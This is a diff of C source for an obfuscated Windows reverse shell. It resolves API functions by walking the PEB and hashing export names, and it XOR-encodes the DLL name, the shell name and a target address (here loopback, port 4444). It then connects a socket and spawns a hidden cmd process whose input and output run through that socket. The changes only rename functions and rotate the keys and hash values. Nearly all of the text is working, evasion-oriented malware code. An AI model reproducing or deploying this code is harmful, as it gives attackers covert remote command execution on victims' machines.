@@ -3,16 +3,16 @@
 
 /*---------------------------------------------------------------------------------------------------------------------------------------------------------------*/
 
-#define KEY1 0x25
-#define KEY2 0x0e
-#define KEY3 0x96
+#define KEY1 0x1d
+#define KEY2 0x9d
+#define KEY3 0x45
 
-#define SEED                7
-#define LOADLIBRARYA_H      3316055624
-#define CREATEPROCESSA_H    1259903768
-#define WSASTARTUP_H        338422188
-#define WSASOCKETA_H        356187912
-#define CONNECT_H           1601391134
+#define SEED                130
+#define LOADLIBRARYA_H      2490052624
+#define CREATEPROCESSA_H    2301677988
+#define WSASTARTUP_H        559900886
+#define WSASOCKETA_H        1384560375
+#define CONNECT_H           2088465164
 
 #define LOSELOSE_HASH(s, hash) do {                   \
     (hash) = 0;                                       \
@@ -28,95 +28,129 @@
 #define ARRAYSIZE(a)            (sizeof(a)/sizeof((a)[0]))
 #endif
 
-#define XOR_ARR(buf, key)       xor_n((buf), ARRAYSIZE(buf), (key))
-#define HTONS(x)                ( ( (( (USHORT)(x) ) >> 8 ) & 0xff) | ((( (USHORT)(x) ) & 0xff) << 8) )
+#define XOR_ARRAY(buf, key)       xor_n((buf), ARRAYSIZE(buf), (key))
 
 /*---------------------------------------------------------------------------------------------------------------------------------------------------------------*/
 
-static inline  __attribute__((always_inline)) unsigned char xor8(unsigned char x, unsigned char y) {
+static inline __attribute__((always_inline)) unsigned char xor8(unsigned char x, unsigned char y) {
 	return x ^ y ;
 }
 
-static inline  __attribute__((always_inline)) void xor_n(unsigned char *buf, size_t n, unsigned char key) {
+static inline __attribute__((always_inline)) void xor_n(unsigned char *buf, size_t n, unsigned char key) {
     for (size_t i = 0; i < n; ++i)
 		buf[i] = xor8(buf[i], key);
 }
 
-static HMODULE GetProcAddressPEB(DWORD64 qwFuncHash) {    
-	PIMAGE_EXPORT_DIRECTORY pImgExportDir;
-	DWORD dwFunctionNumber, dwHash;    
-	PDWORD pdwFuncNameBase;
-	PCSTR pszFunctionName;
-	WORD wOrdinalIndex;
+static FARPROC ResolveApiByHash(DWORD64 qwApiHash) {
+    PIMAGE_EXPORT_DIRECTORY pImgExportDir;
+    DWORD dwFunctionNumber, dwHash;
+    PDWORD pdwFuncNameBase;
+    PCSTR pszFunctionName;
+    WORD  wOrdinalIndex;
 
-	PPEB pPEB = (PPEB) __readgsqword( 0x60 ); // Access the PEB structure directly via GS:[0x60] on x64.
-	PPEB_LDR_DATA Ldr = (PPEB_LDR_DATA) pPEB->Ldr; // The PEB contains a pointer to PEB_LDR_DATA, which has a linked list of loaded modules.    
-	PLIST_ENTRY pNextModule = Ldr->InLoadOrderModuleList.Flink; // This is the first module (usually the main EXE), and from here we walk the list.    
-	PLDR_DATA_TABLE_ENTRY DataTableEntry = (PLDR_DATA_TABLE_ENTRY) pNextModule;	 
-	while (DataTableEntry->DllBase != NULL) {    
-    	DWORD64 qwModuleBase = (DWORD64)DataTableEntry->DllBase;	// Loop over all modules. DllBase is the base address of the module in memory.    
-    	PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS) ( qwModuleBase + ((PIMAGE_DOS_HEADER) qwModuleBase)->e_lfanew); // Locate NT headers using the PE structure (DOS header --> NT header).    
-    	DWORD dwExportDirRVA = pImgNtHdrs->OptionalHeader.DataDirectory[0].VirtualAddress; // This retrieves the Export Directory from the module.
-    	DataTableEntry = (PLDR_DATA_TABLE_ENTRY) DataTableEntry->InLoadOrderLinks.Flink; // Get the next loaded module entry (ntdll.dll --> kernel32.dll)
-    	if (dwExportDirRVA == 0) {
-        	continue;
-    	}    
-    	pImgExportDir = (PIMAGE_EXPORT_DIRECTORY) ((DWORD64) qwModuleBase + dwExportDirRVA); // Get a pointer to the actual export directory table.
-    	dwFunctionNumber = pImgExportDir->NumberOfNames;
-    	pdwFuncNameBase = (PDWORD) ((PCHAR) qwModuleBase + pImgExportDir->AddressOfNames);  // Extract names of all exported functions from the module.
-    	for (DWORD idx = 0; idx < dwFunctionNumber; idx++) {
-        	pszFunctionName = (PCSTR) (*pdwFuncNameBase + (DWORD64) qwModuleBase);
-        	pdwFuncNameBase++;    
-        	LOSELOSE_HASH(pszFunctionName, dwHash);    
-        	if (dwHash == qwFuncHash) {	// For each function, hash its name and compare it to the input hash.                       	 
-            	wOrdinalIndex = *(PWORD)(((DWORD64) qwModuleBase + pImgExportDir->AddressOfNameOrdinals) + (2 * idx));
-            	return (HMODULE) ((DWORD64) qwModuleBase + *(PDWORD)(((DWORD64) qwModuleBase + pImgExportDir->AddressOfFunctions) + (4 * wOrdinalIndex))); // If matched, resolve function address using its ordinal --> RVA --> VA.                               	 
-        	}
-    	}
-	}
-	return NULL;
+    // x64: GS:[0x60] -> PEB (via TEB). PEB holds loader state + module lists.
+    PPEB pPEB = (PPEB)__readgsqword(0x60);
+
+    // PEB->Ldr -> PEB_LDR_DATA, contains linked lists of loaded modules (EXE + DLLs).
+    PPEB_LDR_DATA Ldr = (PPEB_LDR_DATA)pPEB->Ldr;
+
+    // Walk InLoadOrderModuleList (circular list). Entries are LDR_DATA_TABLE_ENTRY.
+    PLDR_DATA_TABLE_ENTRY DataTableEntry =
+        (PLDR_DATA_TABLE_ENTRY)Ldr->InLoadOrderModuleList.Flink;
+
+    while (DataTableEntry->DllBase != NULL)
+    {
+        // DllBase = module image base address in memory.
+        DWORD64 qwModuleBase = (DWORD64)DataTableEntry->DllBase;
+
+        // Parse PE headers: DOS -> e_lfanew -> NT headers.
+        PIMAGE_NT_HEADERS pImgNtHdrs =
+            (PIMAGE_NT_HEADERS)(qwModuleBase + ((PIMAGE_DOS_HEADER)qwModuleBase)->e_lfanew);
+
+        // Export directory RVA (DataDirectory[EXPORT]).
+        DWORD dwExportDirRVA =
+            pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+
+        // Advance to next module now (safe for continue).
+        DataTableEntry =
+            (PLDR_DATA_TABLE_ENTRY)DataTableEntry->InLoadOrderLinks.Flink;
+
+        // No exports -> skip.
+        if (dwExportDirRVA == 0)
+            continue;
+
+        // RVA->VA: export directory lives at moduleBase + RVA.
+        pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(qwModuleBase + dwExportDirRVA);
+
+        // Export tables: names[] -> ordinals[] -> functions[] (all RVAs).
+        dwFunctionNumber = pImgExportDir->NumberOfNames;
+        pdwFuncNameBase  = (PDWORD)((PCHAR)qwModuleBase + pImgExportDir->AddressOfNames);
+
+        for (DWORD idx = 0; idx < dwFunctionNumber; idx++)
+        {
+            // names[idx] is an RVA to an ASCII function name string.
+            pszFunctionName = (PCSTR)(qwModuleBase + *pdwFuncNameBase++);
+            LOSELOSE_HASH(pszFunctionName, dwHash);
+
+            if (dwHash == qwApiHash)
+            {
+                // ordinals[idx] maps name->function index.
+                wOrdinalIndex =
+                    *(PWORD)(qwModuleBase + pImgExportDir->AddressOfNameOrdinals + (idx * sizeof(WORD)));
+
+                // functions[ordinal] is an RVA to the implementation. Return VA.
+                return (FARPROC)(qwModuleBase +
+                    *(PDWORD)(qwModuleBase + pImgExportDir->AddressOfFunctions + (wOrdinalIndex * sizeof(DWORD))));
+            }
+        }
+    }
+
+    // Not found in any loaded module exports.
+    return NULL;
 }
+
 
 /*---------------------------------------------------------------------------------------------------------------------------------------------------------------*/
 
 void Main(void) {
     
-	int port = 4444 ;
+	unsigned char addr[] = {0xe2, 0x9d, 0x9d, 0x9c, 0x8c, 0xc1, 0x9d};
 
-	unsigned char ip[] = {0x71, 0x0e, 0x0e, 0x0f, 0x0e};
 	
+	char ws2_32_dll[] = {0x6a, 0x6e, 0x2f, 0x42, 0x2e, 0x2f, 0x33, 0x79, 0x71, 0x71, 0x1d};
 	//   ws2_32.dll    0x77  0x73  0x32  0x5f  0x33  0x32  0x2e  0x64  0x6c  0x6c  key
-	char ws2_32_dll[] = {0x52, 0x56, 0x17, 0x7a, 0x16, 0x17, 0x0b, 0x41, 0x49, 0x49, 0x25};
 
+
+	char shell[] = {0x26, 0x28, 0x21, 0x45};
 	//	 cmd	  0x63, 0xcd, 0x64, key
-	char cmd[] = {0xf5, 0xfb, 0xf2, 0x96};
 	// powershell 0x70, 0x6f, 0x77, 0x65, 0x72, 0x73, 0x68, 0x65, 0x6c, 0x6c,  key
 
 	RUNTIME_CONTEXT ctx = { 0 };
-	ctx.api.pLoadLibraryA = (PLOADLIBRARYA)GetProcAddressPEB(LOADLIBRARYA_H);
-	XOR_ARR(ws2_32_dll, KEY1);
+	ctx.api.pLoadLibraryA = (PLOADLIBRARYA)ResolveApiByHash(LOADLIBRARYA_H);
+	XOR_ARRAY(ws2_32_dll, KEY1);
 	ctx.api.pLoadLibraryA(ws2_32_dll);
-	ctx.api.pWSAStartup = (PWSASTARTUP)GetProcAddressPEB(WSASTARTUP_H);
+	ctx.api.pWSAStartup = (PWSASTARTUP)ResolveApiByHash(WSASTARTUP_H);
 	ctx.api.pWSAStartup(MAKEWORD(2, 2), &ctx.winsock.wsadata);
-	ctx.api.pWSASocketA = (PWSASOCKETA)GetProcAddressPEB(WSASOCKETA_H);
+	ctx.api.pWSASocketA = (PWSASOCKETA)ResolveApiByHash(WSASOCKETA_H);
 	ctx.winsock.socket = ctx.api.pWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0); 
 	ctx.winsock.sa.sin_family = AF_INET;
-	ctx.winsock.sa.sin_port = HTONS(port);
-	XOR_ARR(ip, KEY2);
-	ctx.winsock.sa.sin_addr.S_un.S_un_b.s_b1 = ip[0]; 
-	ctx.winsock.sa.sin_addr.S_un.S_un_b.s_b2 = ip[1]; 
-	ctx.winsock.sa.sin_addr.S_un.S_un_b.s_b3 = ip[2]; 
-	ctx.winsock.sa.sin_addr.S_un.S_un_b.s_b4 = ip[3]; 
-	ctx.api.pConnect = (PCONNECT)GetProcAddressPEB(CONNECT_H);
+	XOR_ARRAY(addr, KEY2);
+	((unsigned char *)&ctx.winsock.sa.sin_port)[0] = addr[4];
+	((unsigned char *)&ctx.winsock.sa.sin_port)[1] = addr[5];
+	ctx.winsock.sa.sin_addr.S_un.S_un_b.s_b1 = addr[0]; 
+	ctx.winsock.sa.sin_addr.S_un.S_un_b.s_b2 = addr[1]; 
+	ctx.winsock.sa.sin_addr.S_un.S_un_b.s_b3 = addr[2]; 
+	ctx.winsock.sa.sin_addr.S_un.S_un_b.s_b4 = addr[3]; 
+	ctx.api.pConnect = (PCONNECT)ResolveApiByHash(CONNECT_H);
 	ctx.api.pConnect(ctx.winsock.socket, (struct sockaddr*)&ctx.winsock.sa, sizeof(ctx.winsock.sa)); 
 	ctx.process.si.cb = sizeof(ctx.process.si);
 	ctx.process.si.dwFlags = (STARTF_USESTDHANDLES);
 	ctx.process.si.hStdInput = (HANDLE)ctx.winsock.socket;
 	ctx.process.si.hStdOutput = (HANDLE)ctx.winsock.socket;
 	ctx.process.si.hStdError = (HANDLE)ctx.winsock.socket;
-	XOR_ARR(cmd, KEY3);
-	ctx.api.pCreateProcessA = (PCREATEPROCESSA)GetProcAddressPEB(CREATEPROCESSA_H);
-	ctx.api.pCreateProcessA(NULL, (LPSTR)cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, (LPSTARTUPINFOA)&ctx.process.si, &ctx.process.pi); 
+	XOR_ARRAY(shell, KEY3);
+	ctx.api.pCreateProcessA = (PCREATEPROCESSA)ResolveApiByHash(CREATEPROCESSA_H);
+	ctx.api.pCreateProcessA(NULL, (LPSTR)shell, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, (LPSTARTUPINFOA)&ctx.process.si, &ctx.process.pi); 
 
 }
 
